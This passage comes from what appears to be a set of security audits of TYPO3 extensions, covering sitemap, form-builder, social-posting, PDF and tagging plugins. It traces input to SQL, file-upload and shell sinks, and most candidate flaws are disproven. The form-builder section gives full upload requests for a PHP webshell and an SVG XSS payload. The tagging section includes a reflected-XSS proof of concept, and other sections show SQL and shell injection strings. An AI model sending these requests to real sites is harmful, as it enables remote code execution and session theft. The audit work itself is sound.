`$newsId` = `$row['uid']` (DB value, not request) and is additionally wrapped in
`intval()`. **Safe.**

`singlePid` (`_GP('singlePid')`, `:91`) → `intval()`; `useCategorySinglePid`
(`:93`) → `(bool)`. Neither reaches SQL unescaped.

### Out of pre-auth scope
`Classes/Scheduler/AdditionalFieldsProvider.php:193-194` runs a raw
`exec_SELECTgetRows` against `sys_domain`, but it is a **backend Scheduler**
component (not the eID path) and the value is escaped with
`$GLOBALS['TYPO3_DB']->fullQuoteStr(...)`. Not exploitable pre-auth.

## 3. Trigger request (for confirmation testing — expected NOT injectable)
```
GET /?eID=dd_googlesitemap&sitemap=tt_news&type=news&pidList=1,2,3&L=0&offset=0&limit=100
```
Injection attempts such as `&L=1 OR 1=1`, `&pidList=1) UNION SELECT ...`,
`&offset=1;DROP` are neutralized by `canBeInterpretedAsInteger` / `intExplode` /
`(int)` respectively.

## Conclusion
This clone contains the upstream hardening for the historic `dd_googlesitemap`
pre-auth SQLi (TYPO3-EXT-SA advisory era). All request-derived values entering
the raw `TYPO3_DB` queries are integer-cast or integer-validated. **No confirmed
pre-auth SQL injection.** The generator SQL code is byte-identical to Fork B
(`communiacs`).

### dmitryd_typo3-dd-googlesitemap

#### Security Audit — dmitryd/dd_googlesitemap v2.3.2

**eID handler:** `dd_googlesitemap` → `EXT:dd_googlesitemap/Classes/Generator/EntryPoint.php` (registered in `ext_localconf.php` line 7). Pre-auth: **yes** — eID scripts run before FE user authentication. `EntryPoint->main()` dispatches on `?sitemap=` to a generator (`pages` or `tt_news`) via `GeneralUtility::callUserFunction`.

## Summary

Version 2.3.2 is a **patched** release. Every request-derived value that reaches a SQL sink is integer-normalised or guarded, and every value reflected into the XML output is passed through `htmlspecialchars()`/`typoLink()`. The historical dd_googlesitemap SQL-injection class (unsanitised `L` / `pidList` in the tt_news generator, seen in older 1.x releases) is **fixed** here. Hidden/access-restricted records are protected by `enableFields()`. **No pre-auth SQLi, XSS, or information-disclosure vulnerability was confirmed in this version.** Findings below are recorded as *disproven* with the exact guard that neutralises each candidate sink.

---

## Candidate 1 — SQL injection in tt_news generator (DISPROVEN)

- **Severity:** N/A (not exploitable) · **Pre-auth:** would be, if present
- **Sink:** `Classes/Generator/TtNewsSitemapGenerator.php:105-112` — `$GLOBALS['TYPO3_DB']->exec_SELECTquery('*','tt_news', 'pid IN (' . implode(',', $this->pidList) . ')' ... $languageCondition ..., '', 'datetime DESC', $this->offset . ',' . $this->limit)`
- **Sources traced:**
  - `pidList` ← `GeneralUtility::_GP('pidList')` → `validateAndcreatePageList()` (line ~197) applies `GeneralUtility::intExplode(',', ...)` **and** each pid must pass `isInRootline()`. Result array holds pure integers → `implode(',', ...)` yields an integer list. **Not injectable.**
  - `L` ← `GeneralUtility::_GP('L')` (line ~99). Concatenated into `' AND sys_language_uid=' . $language` **only inside** `if (MathUtility::canBeInterpretedAsInteger($language))`. Only strict integer strings pass the guard. **Not injectable.**
  - `offset` / `limit` ← `AbstractSitemapGenerator::__construct` lines 74-78: `max(0, (int)GeneralUtility::_GET('offset'))` / `max(0, (int)GeneralUtility::_GET('limit'))`. Integers. **Not injectable.**
  - `singlePid` ← `intval(GeneralUtility::_GP('singlePid'))` (line ~86) and additionally rootline-checked.
  - `getSinglePidFromCategory()` (line ~148): `exec_SELECT_mm_query(... ' AND tt_news_cat_mm.uid_local = ' . intval($newsId))` — `intval`. **Not injectable.**
- **Conclusion:** all tainted inputs are int-cast or guarded before reaching the query. The classic advisory sink is patched.

## Candidate 2 — Information disclosure of hidden / restricted records (DISPROVEN)

- The tt_news query appends `$this->cObj->enableFields('tt_news')` (line ~110), which enforces `hidden`, `deleted`, `starttime`, `endtime` and `fe_group`. Hidden and access-protected news are excluded.
- The pages generator (`PagesSitemapGenerator`) walks the tree with `sys_page->getMenu()` (respects `where_hid_del`) and filters `no_search`, plus `excludedPageTypes` (sysfolder/recycler/BE-user-section/etc.) in `shouldIncludePageInSitemap()`. The `str_replace()` on `where_hid_del` (lines ~136-152) only relaxes the **doktype** clause (to re-include sysfolders into traversal); it leaves the hidden/time/fe_group predicates intact, and doktype is re-filtered afterwards. No hidden-record leak.

## Candidate 3 — XSS in XML output (DISPROVEN)

- `StandardSitemapRenderer::renderEntry()` emits only `<loc>$url</loc>` where `$url` comes from `getPageLink()` → `htmlspecialchars($this->cObj->typoLink(...))`. The `$title` argument is **not** emitted by the standard renderer.
- `NewsSitemapRenderer::renderEntry()` wraps `$title`, `$keywords`, `$sitename`, `$GLOBALS['TSFE']->lang` in `htmlspecialchars()`; `$url` from `getNewsItemUrl()` is `htmlspecialchars()`-wrapped on the default path.
- None of the reflected values are request-controlled pre-auth (they derive from DB records / TypoScript). No injection point.

## Version / advisory cross-reference

- v2.3.2 (2014-era) already contains the `MathUtility::canBeInterpretedAsInteger()` guard on `L` and `intExplode()` on `pidList` — i.e. it post-dates the dd_googlesitemap SQL-injection fixes. No known unpatched advisory applies to the eID sinks in this release.

**Verdict: no actionable vulnerability. The juicy SQLi target is already patched in 2.3.2.**

### dmk_mkforms

#### TYPO3 Security Audit — `dmk_mkforms` (MK Forms) upload widgets

**Extension:** mkforms (`dmk_mkforms`) — "MK Forms — Making HTML forms for TYPO3"
**Version:** 12.0.5 (`ext_emconf.php:17`)
**TYPO3 compat:** `typo3 11.5.7-12.4.99`, depends `rn_base >= 1.17.0` (`ext_emconf.php:33-37`)
**Authors:** René Nitzsche, Michael Wagner, Hannes Bochmann — DMK E-BUSINESS GmbH
**Lineage:** fork of `ameos_formidable` (conflicts with it). mkforms is a generic form builder; forms render on the public FE (`tt_content` plugin) and process submissions **pre-auth** (anonymous). Two of the three widgets also expose an **eID-style AJAX upload endpoint** (`mkformsAjaxId`, dispatched by `Classes/Middleware/AjaxHandler.php` → `formidableajax::run`).

Key shared facts:
- `cleanupFileName()` (`util/class.tx_mkforms_util_Div.php:838`) is **NOT** an extension filter. It transliterates, lowercases, replaces `[^A-Za-z0-9-_.]` with `_`, and trims enclosing dots. `shell.php`, `shell.phtml`, `shell.php5`, `shell.php.` (→`shell.php`) all survive unchanged. It does **not** strip or randomize the extension.
- The optional `validator:FILE` `/extension` allow-list (`validator/file/class.tx_mkforms_validator_file_Main.php:67-88`) is only active if the **form author** declares `<validate>` in the form XML. It runs at `after-validation-*`, i.e. **after** the file has already been moved into the target dir at checkpoint `after-init-datahandler`; on failure it `@unlink`s. So even when configured it is a post-write cleanup (TOCTOU window), not a pre-write gate.
- Destination dir is author-controlled via form XML `/data/targetdir` (or `/data/targetfile`). Typical mkforms usage points this at a writable, web-served dir (`uploads/…`, `fileadmin/…`) where TYPO3 executes PHP by default.

---

## Widget 1 — `widgets/upload/class.tx_mkforms_widgets_upload_Main.php` (renderlet `UPLOAD`)

### Verdict: **CONFIRMED pre-auth arbitrary file upload → RCE candidate** (no deny-pattern, no built-in extension check; RCE realized when the form's `targetdir` is a PHP-executing web dir — the widget itself imposes *zero* restriction)

### Upload + naming chain
- Sink: `move_uploaded_file($aData['tmp_name'], $sTarget)` — **`widgets/upload/class.tx_mkforms_widgets_upload_Main.php:215`**
- Filename derivation: `$sName = basename($aData['name']);` — **line 188** (attacker-controlled client filename, kept verbatim)
- Optional cleanup: `cleanupFileName($sName)` gated by `defaultTrue('/data/cleanfilename') && defaultTrue('/cleanfilename')` — **line 189-191** (on by default, but does **not** touch the `.php` extension)
- Target assembly: `$sTarget = $sTargetDir.$sName;` — **line 193**; dir auto-created if `/data/targetdir/createifneeded` — line 195-200
- Collision handling only appends `[N]` before the extension — line 202-212 (extension always preserved)
- Trigger point: `checkPoint()` → `manageFile()` at `after-init-datahandler` — line 32-39 / 144

### Validation present?
**None in the widget.** There is:
- no `verifyFilenameAgainstDenyPattern` / core `fileDenyPattern` call anywhere in this widget,
- no MIME / `$_FILES[...]['type']` check,
- no extension allow-list (unless the *form author* adds `validator:FILE /extension`, which is optional and post-move).
`.php` / `.phtml` / `.php5` pass through `basename()`+`cleanupFileName()` untouched. Double-extension not even needed.

### Reachability / auth
Anonymous FE visitor submitting a normal multipart POST to the page that renders the form. `manageFile()` runs on the standard submit flow — **pre-auth**, no AJAX endpoint required.

### Destination / execution
`$sTargetDir` = form XML `/data/targetdir`. If web-reachable and PHP-executing (default for `fileadmin/` and `uploads/` in TYPO3), the uploaded `.php` is directly executable → RCE. If the author instead points it outside the docroot or adds an extension allow-list, residual = arbitrary-file-write / stored-XSS via `.svg`/`.html`.

### Trigger (multipart form POST)
```
POST /the-page-with-the-form HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="formid"

<rendered form id>
--X
Content-Disposition: form-data; name="<widgetHtmlName>"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['c']); ?>
--X--
```
(`<widgetHtmlName>` = `$this->_getElementHtmlName()` emitted by `_render()` line 67; the form must include an `UPLOAD` renderlet with a defined `targetdir`.)
Result file: `<targetdir>/shell.php`.

---

## Widget 2 — `widgets/mediaupload/class.tx_mkforms_widgets_mediaupload_Main.php` (renderlet `MEDIAUPLOAD`)

### Verdict: **CONFIRMED pre-auth arbitrary file upload → RCE candidate** (raw attacker-named file hits `targetdir` via `move_uploaded_file` *before* any FAL indexing; no deny-pattern, no extension check). Additionally reachable via a dedicated **AJAX upload endpoint**.

### Upload + naming chain
- Sink: `move_uploaded_file($aData['tmp_name'], $sTarget)` — **`widgets/mediaupload/class.tx_mkforms_widgets_mediaupload_Main.php:327`** (inside `handleUpload()`)
- Filename: `$sName = $aData['name'];` — **line 283** (client filename, verbatim), optional `cleanupFileName()` gated by `_defaultTrue('/data/cleanfilename')` — line 284-286 (again does not strip `.php`)
- Target: `$sTarget = $sTargetDir.$sName;` — line 288 (`getTargetFileData()`); collision suffix `_N` preserves extension — line 289-296
- FAL indexing (`TSFAL::indexProcess`) happens at **line 350 — after the raw move at 327**, so the attacker-named file already exists on disk regardless of indexing/rename.
- Normal-submit trigger: `checkPoint()` → `manageFile()` at `after-init-datahandler` — line 142-149
- **AJAX trigger:** `handleAjaxRequest()` — **line 784** → `getRawFile()` (line 786) → `handleUpload()` (line 820) → same `move_uploaded_file` sink. Endpoint registered in `ext_localconf.php:115` (`ajax_services['widget_mediaupload']['upload']`), URL built in `createUploadUrl()` line 763-782.

### Validation present?
No deny-pattern, no extension allow-list, no real-content/MIME check in the widget. The AJAX path runs `validator:FILE` only if the form declares `/validate` (line 801-816) — same optional/author-dependent allow-list as widget 1, and only if configured. Nothing blocks `.php` by default.

### Reachability / auth
- Standard FE submit: anonymous, pre-auth.
- AJAX: anonymous visitor loads the form page (registers `ajax_services[...][safelock]` in the FE session at render, line 774-779), then POSTs multipart to `/?mkformsAjaxId=<eid>&object=widget_mediaupload&servicekey=upload&formid=<id>&safelock=<hash>&thrower=<id>` with file field `<widget name>`. Dispatched by `Classes/Middleware/AjaxHandler.php`. The `safelock`/session gate is satisfied by simply having rendered the form — no login.

### Destination / execution
`getTargetDir()` from `/data/targetdir` (line 468-478). Same reasoning as widget 1: PHP-executing web dir → RCE. Note this widget targets DAM/FAL installs; the raw file write is independent of whether DAM/FAL is present. Residual (non-executing dir / extension allow-list configured) = arbitrary-file-write / stored-XSS.

### Trigger (AJAX multipart)
```
POST /?mkformsAjaxId=<eid>&object=widget_mediaupload&servicekey=upload&formid=<id>&safelock=<hash>&thrower=<htmlid> HTTP/1.1
Content-Type: multipart/form-data; boundary=X
Cookie: fe_typo_user=<session from loading the form page>

--X
Content-Disposition: form-data; name="<widget name path>"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
--X--
```

---

## Widget 3 — `widgets/swfupload/class.tx_mkforms_widgets_swfupload_Main.php` (renderlet `SWFUPLOAD`)

### Verdict: **HARDENED by default** (core `fileDenyPattern` is enforced on the uploaded filename **before** the move, on by default). Residual: **stored-XSS / arbitrary-file-write via non-executable extensions** (`.svg`, `.html`, `.xml`), and **RCE only if the form author explicitly sets `<usedenypattern>false</usedenypattern>`**.

### Upload + naming chain
- Sink: `T3General::upload_copy_move($aFile['tmp_name'], $sTarget)` — **`widgets/swfupload/class.tx_mkforms_widgets_swfupload_Main.php:174`** (inside `handleAjaxRequest()`, this widget uploads **only** via the AJAX/eID endpoint)
- Filename: `$sFileName = $aFile['name'];` from `$GLOBALS['_FILES']['rdt_swfupload']` — **line 141-143**
- **Deny-pattern gate (the differentiator):**
  ```php
  if (false !== $this->_defaultTrue('/usedenypattern')) {          // line 145
      if (!Sys25\RnBase\Utility\T3General::verifyFilenameAgainstDenyPattern($sFileName)) {
          exit('FILE EXTENSION DENIED');                          // line 147
      }
  }
  ```
  `_defaultTrue()` returns `true` when the key is absent (`api/class.mainobject.php:147-154`), so `false !== true` → the check runs **by default**. `verifyFilenameAgainstDenyPattern` applies TYPO3's `$GLOBALS['TYPO3_CONF_VARS']['BE']['fileDenyPattern']`, whose default blocks `.php`, `.php3-7`, `.phtml`, `.phar`, `.pht`, `.htaccess`, etc.
- Optional cleanup: `cleanFileName()` + `strtolower` — line 151-155
- Target: `$sTarget = $sTargetDir.$sFileName;` — line 158; collision suffix `[N]` — line 166-172

### Validation present?
Yes — core `fileDenyPattern` (default on). No positive extension allow-list, and the check is against the client filename string (deny-list, not content), but the deny-list is exactly what blocks the executable PHP extensions. The `swfupload_config['file_types']` client-side hint (`getFileType()`, line 386-397) is cosmetic and not enforced server-side.

### Bypass analysis
- `.php`, `.phtml`, `.php5`, `.phar`, trailing-dot `shell.php.` → all matched/normalized and **denied** by the default `fileDenyPattern` (the pattern is anchored to handle trailing dots/spaces and `.php.` forms).
- **Residual write of non-executable but harmful types** — `.svg` (stored XSS), `.html`/`.htm` (stored XSS in the upload dir), `.xml` — are **not** in `fileDenyPattern` and are written verbatim to the web dir → stored-XSS / arbitrary file write.
- **RCE resurfaces** if the form XML sets `<usedenypattern>false</usedenypattern>` (or the site weakened `fileDenyPattern`), because then line 145's guard is skipped and any `.php` name reaches `upload_copy_move`.

### Reachability / auth
AJAX/eID only, anonymous: load the form page (registers `ajax_services['rdt_swfupload']['upload'][safelock]`, line 93-98; endpoint registered `ext_localconf.php:120`), then POST multipart with field `rdt_swfupload` to `/?mkformsAjaxId=<eid>&object=rdt_swfupload&servicekey=upload&formid=<id>&safelock=<hash>&thrower=<htmlid>`. Pre-auth.

### Trigger (residual stored-XSS demo)
```
POST /?mkformsAjaxId=<eid>&object=rdt_swfupload&servicekey=upload&formid=<id>&safelock=<hash>&thrower=<htmlid> HTTP/1.1
Content-Type: multipart/form-data; boundary=X
Cookie: fe_typo_user=<session from loading the form page>

--X
Content-Disposition: form-data; name="rdt_swfupload"; filename="x.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
--X--
```

---

## Summary table

| Widget | Sink (file:line) | Filename source | Deny-pattern / ext check | Verdict |
|---|---|---|---|---|
| `UPLOAD` | `widgets/upload/…Main.php:215` `move_uploaded_file` | `basename($aData['name'])` (:188) | **none** (only optional post-move `validator:FILE`) | **CONFIRMED pre-auth arbitrary-upload → RCE** (config-dependent targetdir; widget imposes no restriction) |
| `MEDIAUPLOAD` | `widgets/mediaupload/…Main.php:327` `move_uploaded_file` (+ AJAX `:784`) | `$aData['name']` (:283) | **none** | **CONFIRMED pre-auth arbitrary-upload → RCE** (raw file written before FAL indexing) |
| `SWFUPLOAD` | `widgets/swfupload/…Main.php:174` `upload_copy_move` (AJAX only) | `$aFile['name']` (:143) | **core `fileDenyPattern`, ON by default** (:145-147) | **HARDENED** — residual stored-XSS/file-write via `.svg`/`.html`; RCE only if `<usedenypattern>false</usedenypattern>` |

## Root cause
`UPLOAD` and `MEDIAUPLOAD` preserve the attacker-controlled client filename/extension (`basename()` / verbatim) and hand it straight to `move_uploaded_file()` with **no `fileDenyPattern` and no built-in extension allow-list**, unlike sibling `SWFUPLOAD` which *does* call `verifyFilenameAgainstDenyPattern()` by default. `cleanupFileName()` sanitizes characters but never the extension, so `.php` survives. Any mkforms form on a public page that uses an `UPLOAD`/`MEDIAUPLOAD` widget with a web-reachable `targetdir` and no explicit `validator:FILE /extension` allow-list is a pre-auth unrestricted-upload → RCE — the same bug class as the confirmed phorax/formhandler and interfrog/if_basic findings.

## Recommendation
Enforce `verifyFilenameAgainstDenyPattern()` (core `fileDenyPattern`) unconditionally in `UPLOAD` and `MEDIAUPLOAD` **before** the `move_uploaded_file` call (as `SWFUPLOAD` already does), and reject rather than post-unlink on a positive extension allow-list. Do not gate the deny-pattern behind an author-toggleable `/usedenypattern` for any widget.

### dmk_t3socials

#### Security Audit — dmk/t3socials (T3 Socials) v3.0.1

TYPO3 extension that posts records (e.g. tt_news) to social networks (Twitter, Facebook,
Xing, pushd, HybridAuth). Mixed legacy (`tx_t3socials_*`, rnbase) + modern namespaced
backend FormEngine element. Entry points: TCEmain hooks (backend save), a backend AJAX
handler, and one **frontend eID** endpoint (`t3socials-hybridauth`).

## Summary

**No pre-auth code/command injection, SSRF, or object-injection bug was confirmed.**
CodeQL's 9 "code/command injection" candidates are **false positives**: every dynamic
callable/instantiation resolves a **class name from network configuration stored in the
database by a backend editor**, not from an HTTP request, and passes it to
`tx_rnbase::makeInstance()` (an object factory — not `call_user_func`/`exec`/`eval`).
There is no `shell_exec`/`system`/`eval`/`call_user_func`/`unserialize` on any tainted
path (grep-verified). The one genuine unauthenticated attack surface is the HybridAuth
eID endpoint, whose own parameters are integer-cast; residual risk lives in the bundled,
outdated `Hybrid/*` OAuth library rather than in this extension's code.

| Candidate class | Pre-auth | Verdict |
|-----------------|----------|---------|
| Code/command injection (9 CodeQL hits) | — | **False positive** (config-sourced class name → `makeInstance`) |
| SSRF (pushd `file_get_contents`) | No | Not exploitable (URL from backend config) |
| Object injection | — | N/A (no `unserialize` of request data) |
| Pre-auth eID (`t3socials-hybridauth`) | Yes | Attack surface; params int-cast; see note |

---

## CodeQL "code/command injection" candidates — verified FALSE POSITIVES

The flagged sinks are dynamic class instantiations, e.g.:

- `network/pushd/class.tx_t3socials_network_pushd_Connection.php:124-127`
  ```php
  $builderClass = $network->getConfigData('pushd.'.$messageType.'.builder');
  $builderClass = $builderClass ? $builderClass : 'tx_t3socials_network_pushd_MessageBuilder';
  return tx_rnbase::makeInstance($builderClass);
  ```
- `ext_localconf.php:11-22` `tx_t3socials_network_Config::registerNetwork('tx_t3socials_network_*_NetworkConfig')` — **string literals**.
- `network/class.tx_t3socials_network_Config.php` / service registry — instantiate the
  registered network config/connection **class names**.

**Why FP:** `$builderClass` / network class names come from
`Network->getConfigData(...)` — i.e. the `tx_t3socials_networks` record's config field,
editable only by an authenticated backend user with access to that table. The value is
passed to `makeInstance()` (a `new`-style object factory), **not** to a command or code
evaluator. There is no request→sink path, and no OS command / eval is ever built. The
only `exec` token in the codebase is a literal empty service-registration key
(`ext_localconf.php:68 'exec' => ''`). Not exploitable.

---

## SSRF (pushd) — not exploitable

- `network/pushd/class.tx_t3socials_network_pushd_Connection.php:84,98,150-152`
  ```php
  $url = $this->getNetwork()->getConfigData('pushd.url');
  $url .= 'event/'.$event;
  $result = file_get_contents($url, false, $context);
  ```
- The base `$url` is the backend-configured `pushd.url`. `$event` derives from the
  message type / builder output (record-driven, backend), not from an unauthenticated
  request. No user-controlled host reaches `file_get_contents`. Similar for
  `network/hybridauth/.../OAuthCall.php:132` (`getURL` of a fixed template path on disk).
  Not a pre-auth SSRF.

---

## Pre-auth eID `t3socials-hybridauth` — attack surface (no concrete bug in ext code)

- **PRE-AUTH:** Yes. `network/hybridauth/class.tx_t3socials_network_hybridauth_OAuthCall.php:192`
  dispatches on `eID=t3socials-hybridauth`; `eID()` → `oAuthCall()`.
- Parameters: `network` is `(int)`-cast (`:109`), `oAuthCallType` is matched against
  fixed constants (`state`/`logout`/`authenticate`). The network must already exist and
  be configured. So the extension's own handling is type-safe.
- Residual concerns (not confirmed exploitable, config-dependent):
  - `type=authenticate` calls `Hybrid_Endpoint::process()` from the **bundled
    `lib/hybridauth/`** library (an old HybridAuth 2.x snapshot). Historic HybridAuth
    OpenID discovery has SSRF/redirect issues; if an OpenID-type network is enabled this
    surface is inherited. This is a third-party-library exposure, not a flaw in
    dmk_t3socials code.
  - `oAuthCall()` catch block (`:179`) reflects `$e->getMessage()` inside
    `alert("...")`. Exception text is internally generated (class names / config), not
    directly attacker-set, so no reliable XSS was found — noted for completeness.

---

## Not vulnerable / other checks

- No `unserialize`, `eval`, `assert`, `create_function`, `shell_exec`, `system`,
  `passthru`, `proc_open`, or `call_user_func` on request data anywhere in the
  extension code (grep-verified; excludes the bundled twitteroauth/hybridauth vendor
  libs and tests).
- TCEmain hooks (`hooks/class.tx_t3socials_hooks_TCEHook.php`) and the BE AJAX handler
  (`OAuthCall->ajaxId`, registered with `false` = requires BE) are backend/authenticated.
- Bundled vendor libraries under `lib/hybridauth/`, `network/twitter/twitteroauth/`
  are outdated and out of scope for this extension's own code, but should be treated as
  supply-chain risk if the HybridAuth flows are enabled.

## Advisory cross-reference

No specific published TYPO3-EXT-SA identified for dmk_t3socials 3.0.1. No pre-auth
vulnerability confirmed in the extension's own code; recommend removing/upgrading the
bundled HybridAuth library if the eID OAuth flow is in use.

### dmk_webkitpdf

#### Audit: dmk_webkitpdf — CodeQL "Command injection" at Classes/Plugin.php:310

## Verdict: FALSE POSITIVE

The `exec()` at `Classes/Plugin.php:310` runs `$this->scriptCall`, which is built at
`Classes/Plugin.php:285-290`. **Every dynamic component concatenated into the shell string
is passed through `escapeshellarg`/`escapeshellcmd`**, including the request-controlled target
URLs. No attacker-controlled bytes reach the shell unescaped. This does not constitute
command injection.

---

## 1. The `$this->scriptCall` construction (`Classes/Plugin.php:285-290`)

```php
$this->scriptCall =
    escapeshellcmd($this->scriptPath.'wkhtmltopdf').' '.   // [A] binary path
    $this->buildScriptOptions().' '.                       // [B] options
    implode(' ', $urls).' '.                               // [C] target URLs  <-- CodeQL taint sink
    escapeshellarg($this->filename).                       // [D] output filename
    ' 2>&1';
```

Component-by-component escaping status:

| # | Component | Origin | Escaped? |
|---|-----------|--------|----------|
| A | `$this->scriptPath.'wkhtmltopdf'` | Config (`customScriptPath`) or `ExtensionManagementUtility::extPath()` — `init()` line 176-180. Not request-derived. | `escapeshellcmd()` (line 286) |
| B | `buildScriptOptions()` | TypoScript `conf` + `$_COOKIE` | Every option **value** `escapeshellarg`'d (line 428); each cookie name+value `escapeshellarg`'d (line 435). Option **keys** are fixed strings / config-derived (`readScriptSettings`, lines 371-401), not request. |
| C | `implode(' ', $urls)` | **Request input** (`tx_webkitpdf_pi1[urls][]`) or config `urls` | **Each element `escapeshellarg`'d** inside `sanitizeUrl()` — see §2 |
| D | `$this->filename` | `outputPath` + config `filePrefix` + `Utility::generateHash()` (random) + `.pdf` — `init()` line 194. Not request-derived. | `escapeshellarg()` (line 289) |

The CodeQL-tainted part is **[C] the URLs**. Although the URLs are request-controlled, they are
**not** concatenated raw.

## 2. Backward trace of the URL component [C] — the tainted-but-sanitized path

- `main()` `Classes/Plugin.php:142` — `$urls = $this->getUrls();`
- `getUrls()` `Classes/Plugin.php:255-260` — returns
  `$this->requestParameters[$this->requestParameterName]` first, i.e. **request input**
  (`tx_webkitpdf_pi1[urls]` from `getQueryParams()` / `getParsedBody()`, set in `init()`
  lines 165-166), falling back to TypoScript `conf['urls']`.
- `main()` `Classes/Plugin.php:145` — **unconditionally** `$urls = $this->sanitizeUrls($urls);`
  *before* any use.
- `sanitizeUrls()` `Classes/Plugin.php:262-276` — for every URL calls
  `$utility->sanitizeUrl($url, $allowedHosts)` (line 272) and reassigns by reference.
- `sanitizeUrl()` **`Classes/Utility.php:71-83`**:
  ```php
  public function sanitizeUrl(string $url, array $allowedHosts): string
  {
      $parts = parse_url($url);
      if ($parts['host'] !== GeneralUtility::getIndpEnv('TYPO3_HOST_ONLY')
          && ($allowedHosts && !in_array($parts['host'], $allowedHosts) || [] === $allowedHosts)) {
          throw new \Exception('Host "'.$parts['host'].'" does not match TYPO3 host.');
      }
      return escapeshellarg($url);          // <-- Classes/Utility.php:82
  }
  ```

So each URL is (a) **host-allow-listed** — by default (`allowedHosts` empty) the host must equal
`TYPO3_HOST_ONLY`, otherwise an exception is thrown and no PDF is generated; and (b) returned
**`escapeshellarg`'d**. The `$urls` array that reaches `generatePdf()` → `implode(' ', $urls)`
(line 288) therefore contains only single-quoted, shell-safe tokens.

There is no alternate path to `exec`: `callExec()` (line 308) is the only shell sink in the whole
`Classes/` tree, `generatePdf()` is `protected` and reachable only via
`main → initializeFileNameToOfferAsDownload → generatePdf`, always after the line-145 sanitize.
`$urls` is not re-fetched or mutated between sanitize and `implode`.

**Why CodeQL fires and why it is wrong:** the dataflow query correctly tracks request input
(`getQueryParams`) into the `exec` argument but does not (or is configured not to) treat
`escapeshellarg` in `Utility::sanitizeUrl` as a barrier — the sanitizer sits in a different
file/method, reassigns via a by-reference loop, and returns through an intermediate array. The
byte sequence an attacker can place is fully contained inside a `'...'` shell-quoted argument
(`escapeshellarg` escapes embedded single quotes), so no metacharacter breaks out. Not injectable.

## 3. Reachability / auth

- The plugin is a **frontend plugin** invoked via `main($content, $conf, $request)` (line 139),
  reachable **pre-auth / anonymous** when a page contains the `tx_webkitpdf_pi1` content element.
- The rendered URL **is** taken from the visitor's request
  (`tx_webkitpdf_pi1[urls][]`, `init()` lines 165-166 / `getUrls()` line 257), so an anonymous
  visitor does control the *value* of component [C].
- **However** that value is host-allow-listed to the site's own host and `escapeshellarg`-quoted
  before it reaches the shell. The attacker controls the bytes of a single shell argument but
  cannot inject shell metacharacters. Pre-auth reachability is real; the injection primitive is not.

## 4. Version & TYPO3 compatibility

- `ext_emconf.php`: **webkitpdf version 13.0.1** (state: beta), author DMK E-BUSINESS GmbH.
- TYPO3 constraint: `typo3 => 12.4.0-13.4.99` (TYPO3 v12.4 – v13.4).

---

## Trigger request (for the record — produces a quoted, non-injecting argument)

```
GET /page-with-webkitpdf-plugin/?tx_webkitpdf_pi1[urls][]=http://<typo3-host>/;id HTTP/1.1
Host: <typo3-host>
```

Result: `sanitizeUrl` accepts it only if the host equals the TYPO3 host, then emits
`'http://<typo3-host>/;id'` as one `escapeshellarg`-quoted token. `wkhtmltopdf` receives it as a
single URL argument; the `;id` is literal inside the quotes and is **not** executed. A payload with
`'`, `$()`, backticks, `|`, `;`, or newlines is likewise neutralized by `escapeshellarg`.

## Bottom line

`escapeshellarg` is applied to the URL (`Classes/Utility.php:82`), to every option value and cookie
(`Classes/Plugin.php:428,435`), and to the output filename (`Classes/Plugin.php:289`); the binary
path gets `escapeshellcmd` (line 286). No attacker-controlled bytes reach the shell string
unescaped. **FALSE POSITIVE.**

### ecodev_tagpack

#### Security Audit — ecodev/tagpack (Tag Pack) v0.13.0

Legacy TYPO3 4.x-era tagging extension (uses `tslib_pibase`, `t3lib_div`,
`$GLOBALS['TYPO3_DB']`, `PATH_tslib`). Frontend plugins `pi1` (tag cloud / search box),
`pi2` (stub "Hello World"), `pi3` (tag nominations / result list); plus a standalone
backend AJAX search endpoint and TCEforms/TCEmain hooks.

## Summary

One **pre-auth reflected XSS** confirmed in the `pi1` frontend plugin. The frontend
SQL paths are **not** injectable (integer-explode / `fullQuoteStr` used consistently).
The AJAX search server contains a real SQL injection but it is **backend
(authenticated) only**. `unserialize($_EXTCONF)` is admin-config sourced (not a
request). Net: CodeQL's SQL sinks in the FE plugins are largely false positives for
SQLi; the genuine request-reachable bug is XSS.

| # | Severity | Pre-auth | Type | Location |
|---|----------|----------|------|----------|
| 1 | Medium | Yes | Reflected XSS | `pi1/class.tx_tagpack_pi1.php` (search box / calendar) |
| 2 | Medium | No (BE auth) | SQL injection | `class.tx_tagpack_ajaxsearch_server.php:102` |

---

## Finding 1 — Pre-auth reflected XSS in pi1 search box / calendar  [MEDIUM]

- **PRE-AUTH:** Yes (frontend `list_type` plugin `tagpack_pi1`).
- **Source:** `$this->piVars[...]` (= `t3lib_div::_GPmerged('tx_tagpack_pi1')`, unsanitized
  GET/POST) and `t3lib_div::_GET($parameter)`.
- **Sinks (HTML attribute value, no `htmlspecialchars`):**
  - `pi1/class.tx_tagpack_pi1.php:321` — `... value="' . $this->piVars['searchWord'] . '" ...`
  - `:302` — generic loop echoing **every** `piVars` key/value into `value="..."`
  - `:366` / `:367` — `value="' . $this->piVars['from'] . '"` / `['to']`
  - `:316` / `:361` / `:312` / `:357` — `value="' . t3lib_div::_GET($parameter) . '"` (keepGetVars)

```php
$searchBox .= '... name="'.$this->prefixId.'[searchWord]" ... value="'
            . $this->piVars['searchWord'] . '" size="20" /></label>';
```

- **Tainted path:** `GET tx_tagpack_pi1[searchWord]` → `piVars['searchWord']` →
  `makeSearchBox()` → concatenated into an `<input value="...">` with no encoding →
  echoed to the page.
- **Exploitability:** Classic attribute-breakout reflected XSS. Rendered whenever the
  plugin's `searchBox` (or `calendar`) is enabled via TypoScript. The generic
  `foreach ($this->piVars ...)` at `:302`/`:347` reflects arbitrary extra parameters
  too.
- **PoC:**
  ```
  /index.php?id=<pi1PageId>&tx_tagpack_pi1[searchWord]="><script>alert(document.cookie)</script>
  ```
- **Caveat:** TYPO3 4.x-only extension; on that platform GET/POST are not auto-encoded,
  so the reflection is live. Fix: wrap every reflected value in `htmlspecialchars()`.

---

## Finding 2 — SQL injection in AJAX search server (BACKEND, authenticated)  [MEDIUM, not pre-auth]

- **PRE-AUTH:** No. `class.tx_tagpack_ajaxsearch_server.php:49` does
  `require_once($BACK_PATH.'init.php')` and the code relies on
  `$GLOBALS['BE_USER']->isAdmin()` / `->getPagePermsClause()` / `->check()` — it runs in
  an authenticated backend context.
- **Sink:** `:102`
  ```php
